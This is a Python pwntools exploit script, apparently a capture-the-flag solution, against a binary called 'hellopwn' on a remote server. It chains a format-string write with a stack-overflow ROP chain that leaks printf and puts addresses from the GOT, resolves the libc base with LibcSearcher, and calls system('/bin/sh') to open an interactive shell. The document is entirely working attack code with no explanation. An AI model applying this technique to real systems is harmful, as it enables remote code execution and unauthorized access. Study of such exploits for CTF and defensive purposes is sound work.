from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")
# io = process("./hellopwn")
e = ELF("./hellopwn")
io = remote("119.45.112.147", 20000)
# gdb.attach(io)

sh_addr = 0x4003DF
vul_addr = 0x4006C7
pop_rdi = 0x4008b3
pop_rsi_r15 = 0x4008b1
payload =  "AAAA%7$n" + p64(0x601090)
io.recvuntil("name?")
io.sendline(payload)
io.recv()
io.recv()
io.recv()

payload = "A" * 0x78 + p64(pop_rdi) + p64(e.got['printf']) + p64(e.sym['puts']) + p64(vul_addr)
io.sendline(payload)
printf_libc_addr = u64(io.recvline()[:6].ljust(8, '\0'))
log.info("printf_libc_addr is " + hex(printf_libc_addr))


payload = "A" * 0x78 + p64(pop_rdi) + p64(e.got['puts']) + p64(e.sym['puts']) + p64(vul_addr)
io.sendline(payload)
puts_libc_addr = u64(io.recvline()[:6].ljust(8, '\0'))
log.info("puts_libc_addr is " + hex(puts_libc_addr))

libc = LibcSearcher("printf", printf_libc_addr)
libc.add_condition("puts", puts_libc_addr)
libc_base = printf_libc_addr - libc.dump("printf")
system_libc_addr = libc_base + libc.dump("system")
sh_addr = libc_base + libc.dump("str_bin_sh")
log.info("system_libc_addr is " + hex(system_libc_addr))


payload = "A" * 0x78 + p64(pop_rdi) + p64(sh_addr) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(system_libc_addr)
io.sendline(payload)
io.interactive()